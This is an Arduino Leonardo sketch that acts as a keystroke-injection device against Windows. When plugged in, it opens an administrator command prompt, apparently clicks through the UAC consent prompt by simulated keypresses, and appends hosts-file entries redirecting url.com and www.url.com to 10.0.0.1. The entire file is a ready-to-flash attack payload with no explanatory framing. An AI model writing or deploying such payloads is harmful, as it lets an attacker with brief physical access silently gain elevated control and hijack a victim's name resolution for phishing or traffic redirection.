#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("cmd /Q /D /T:7F /F:OFF /V:ON /K");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();
  delay(4000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("echo. >> C:\\Windows\\System32\\drivers\\etc\\hosts");
  delay(2000);
  Keyboard.println("echo 10.0.0.1 url.com >> C:\\Windows\\System32\\drivers\\etc\\hosts");
  delay(2000);
  Keyboard.println("echo 10.0.0.1 www.url.com >> C:\\Windows\\System32\\drivers\\etc\\hosts");
  delay(2000);
  Keyboard.println("exit");
  while(1);
}
